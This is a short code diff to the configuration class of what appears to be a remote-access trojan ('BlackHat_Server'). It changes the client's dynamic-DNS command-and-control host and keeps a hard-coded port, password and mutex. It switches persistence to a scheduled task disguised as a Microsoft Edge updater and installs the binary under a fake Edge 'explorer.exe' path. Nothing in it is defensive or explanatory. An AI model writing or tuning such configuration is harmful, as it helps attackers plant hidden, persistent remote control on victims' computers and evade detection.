@@ -35,7 +35,7 @@ namespace BlackHat_Server.Class
 
             ST_Client.Instance.Port = 2401;
             ST_Client.Instance.Password = "slevin";
-            ST_Client.Instance.Host = "apsexfqltj.zapto.org";
+            ST_Client.Instance.Host = "lqphnd2gfz.duckdns.org";
             ST_Client.Instance.ServerName = "imback";
             ST_Client.Instance.sMutex = "tUOns2DB6";
 
@@ -47,14 +47,16 @@ namespace BlackHat_Server.Class
             // ru.GetInstallInfo(out usehk, out useex, out apppath, out usestart, out startupfilename, out hkcuEntry, out exploEntry);
 
 
-            ST_Client.Instance.bUseHKCU = true;
+            ST_Client.Instance.UseTaskScheduler = true;
+            ST_Client.Instance.bUseHKCU = false;
             ST_Client.Instance.bUseExplorer = false;
             ST_Client.Instance.bUseStartupFolder = false;
 
 
-            ST_Client.Instance.sAppDataInstall = "Microsoft\\winexplorer\\explorer.exe";
+            ST_Client.Instance.sAppDataInstall = "Microsoft\\Windows\\Edge\\explorer.exe";
             ST_Client.Instance.sStartupFileName = "explore.exe";
-
+            ST_Client.Instance.TaskSchedulerName = "MicrosoftEdgeUpdaterTaskMachineCore";
+            
             ST_Client.Instance.sHKCUEntry = "winexplorer";
             ST_Client.Instance.sExplorerEntry = "EXPLORER";
 
